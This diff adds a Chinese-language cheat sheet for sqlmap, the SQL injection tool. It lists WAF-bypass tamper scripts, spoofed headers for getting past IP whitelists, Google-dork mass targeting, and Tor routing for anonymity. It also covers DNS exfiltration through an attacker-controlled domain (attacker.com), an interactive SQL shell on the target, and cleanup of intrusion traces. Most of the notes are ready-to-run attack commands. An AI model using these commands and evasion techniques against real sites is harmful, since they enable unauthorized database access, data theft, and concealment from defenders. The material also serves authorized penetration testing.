@@ -1,0 +1,129 @@
+Sqlmap使用指南:
+https://www.tr0y.wang/2018/03/21/sqlmap-guide/
+
+sqlmap -u 'url' --random-agent --safe-url=/--safe-post= --safe-freq=2 --delay=3 --level=5 --batch(看情况)
+
+IP白名单绕过如果不是从网络层获取IP的话
+X-forwarded-for
+X-remote-IP
+X-remote-addr
+X-Real-IP
+
+1.WAF/IPS/IDS identified as 'ASP.NET RequestValidationMode (Microsoft)'
+--tamper "charunicodeencode.py,charencode.py"
+2.WAF/​IPS/​IDS iden­ti­fied as 'Generic (Un­known)'
+--tamper "charunicodeencode.py,charencode.py,space2comment.py"
+3.pace2morehash.py会帮助到你来“打乱”方法函数以绕过WAF的检测。
+--tamper "pace2morehash.py"
+4.两个空格替换脚本：space2mssqlblank.py and space2mysqlblank.py
+5.charencode.py andchardoubleencode.py是两个用来打乱编码的tamper脚本，他们在绕过不同的关键词过滤时很有作用。
+6.如果web应用使用asp/asp.net开发，charunicodeencode.py和percentage.py
+7.自己绕过某IIS下ASP+Mysql数据库的站点曾使用过的sqlmap的tamper
+--tamper charunicodeencode.py,percentage.py
+
+参数: -m
+python sqlmap.py -m url.txt
+
+参数: -g
+python sqlmap.py -g "inurl:\".php?id=1\""
+
+参数：--eval
+每次发送请求前，Sqlmap 都会依据 id 值重新计算 hash 值并更新 GET 请求中的 hash 值:
+python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
+
+参数：--auth-type 和--auth-cred
+这些参数用于进行身份认证。--auth-type用于指定认证方式，支持以下三种身份认证方式：
+Basic
+Digest
+NTLM
+--auth-cred用于给出身份认证的凭证，格式是username:password。
+python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
+
+参数：--auth-file
+若 Web 服务器要求客户端提供证书则可以使用此参数指定一个 PEM 格式的证书文件。我们知道 SSL 协议的客户端认证是可选的，实践中一般都只用服务器端提供自己的证书供客户端验证，很少要求客户端提供自己的证书。
+
+参数：--ignore-401
+使用该参数忽略 401 错误（未认证）。
+
+参数：--tor、--tor-type、--tor-port 和--check-tor
+不管出于什么原因，如果想要保持匿名状态与其使用单个的 HTTP(S)代理，不如安装类似 Privoxy 这样的软件按照Tor 的安装指导配置一个 Tor 客户端。设置好后使用参数--tor让 Sqlmap 自动设置使用 Tor 代理。
+如果想要手动指定 Tor 的类型和端口可以使用参数--tor-type和--tor-port，如：
+--tor-type=SOCKS5 --tor-port 9050
+如果要求高度的匿名性可以使用参数--check-tor，加上该参数后 Sqlmap 会确保所有流量都走 Tor 代理，若 Tor 代理失效，Sqlmap 会发出警告并退出。检测方法是访问Are you using Tor?
+
+参数：--scope
+指定一个 Python 正则表达式对代理日志进行过滤，只测试符合正则表达式的目标，如：
+python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
+
+参数：--force-ssl
+
+检测注入点
+要测试的注入点
+参数：-p 和--skip
+默认情况下 Sqlmap 会测试所有 GET 参数和 POST 参数，当 level 大于等于 2 时会测试 cookie 参数，当 level 大于等于 3 时会测试 User-Agent 和 Referer。实际上还可以手动指定一个以逗号分隔的、要测试的参数列表，该列表中的参数不受 level 限制。这就是-p的作用。
+举个例子，若想只测试 GET 参数id和 User-Agent，则可以这么写：
+-p "id,user-agent"
+如果不想测试某一参数则可以使用--skip。如设置了 level 为 5 但不想测试 User-Agent 和 Referer，则可以这么写：
+--level=5 --skip="user-agent,referer"
+有时会遇到伪静态网页。像动态网页会明目张胆地列出参数，如：
+/user.php?id=1
+显然参数是 id，值为 1。但若是伪静态网页则可能这样写：
+/user/1/
+将参数隐藏在 URL 中。通常情况下 Sqlmap 不会对这样的伪静态网页的参数做测试，因为 Sqlmap 无法判断哪个是参数。若想要对这样的伪静态进行测试，只需要加上*，告诉 Sqlmap 哪个是伪静态参数就行，剩下事的和 GET 参数没有什么区别。如：
+python sqlmap.py -u "http(s)://target.cc/user/1*/"
+
+一键优化
+参数：-o
+添加此参数相当于同时添加下列三个优化参数：
+--keep-alive
+--null-connection
+--threads=3 （如果没有设置一个好的值）
+
+定制 payload
+参数：--prefix 和--suffix
+有时只有在 payload 后添加用户指定的后缀才能注入成功。另一种场景是用户已经知道查询语句怎么写的，此时可以直接指定 payload 的前缀和后缀来完成检测和注入。
+一个有漏洞的源码示例如下：
+query = "SELECT * FROM users WHERE id=('" . $\_GET['id'] . "') LIMIT 0, 1";
+对这样的例子可以让 Sqlmap 自动检测边界范围也可以手动指出边界范围：
+python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
+最终 SQL 语句会变成：
+SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1
+这个句子语法是正确的，payload 也能执行。
+在简单的测试环境下 Sqlmap 不需要被提供定制的边界范围就能够自动检测并完成注入，但在真实世界中某些应用可能会很复杂如嵌套 JOIN 查询，此时就需要为 Sqlmap 指明边界范围。
+
+
+页面对比
+参数：--string、--not-string、--regexp
+默认情况下在布尔型注入中 Sqlmap 通过比较返回页面内容来判断 True 或 False。
+但有时页面每次刷新都会不同，如页面中有动态广告。Sqlmap 会尽力判断出页面中动态的部分来，但并不总能成功。
+用户可以用参数--string指出代表 True 的页面会包含而代表 False 的页面不会包含的字符串以供 Sqlmap 判断 True 或 False，
+若这样的字符串是变动的还可以用参数--regexp指定一个正则表达式去匹配这样的字符串。
+或者用参数--not-string指出代表 False 的页面会包含而代表 True 的页面不会包含的字符串。
+参数：--code
+或者更简单地，若是用户知道代表 True 的页面 HTTP 状态码为 200 而代表 False 的页面 HTTP 状态码不为 200 比如是 401，
+可以用--code参数告诉告诉 Sqlmap 这一信息，如--code=200。
+参数：--titles
+若是用户知道代表 True 的页面 title 和代表 False 的页面 title 不同，
+如代表 True 的页面 title 为Welcome，代表 False 的页面 title 为Forbidden，
+就可以使用参数--titles让 Sqlmap 依据 title 来判断 True 或 False。
+参数：--text-only
+若是 HTTP 响应体中有许多诸如 JavaScript 之类的活动内容，可以使用参数--text-only让 Sqlmap 只专注于纯文本内容。
+
+二阶注入攻击
+参数：--second-order
+有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面，该参数后跟一个 URL
+
+DNS 泄露攻击
+参数：--dns-domain
+SQL 注入中的 DNS 泄露攻击详情见论文《Data Retrieval over DNS in SQL Injection Attacks》。
+假设攻击者控制着某域名（例如：attacker.com）的域名解析服务器，即查询该域名的子域名对应的 IP 地址都会到这台域名解析服务器来查询。
+这时攻击者就可以使用--dns-domain attacker.com来进行 DNS 泄露攻击。
+实际上若是攻击者没有控制任何一台域名解析服务器，那么她可以注册一个新域名，再自己搭建一台域名解析服务器用于接受数据
+
+参数：--sql-query 和--sql-shell
+python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 
+参数--sql-shell提供一个交互式的 SQL 语句执行环境，支持 Tab 键补全和命令历史记录。如：
+python sqlmap.py -u "http://192.168.56.102/user.php?id=1" --sql-shell
+
+参数：--cleanup
+强烈推荐在测试结束后使用此参数清除 Sqlmap 创建的临时表和自定义函数，Sqlmap 会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。
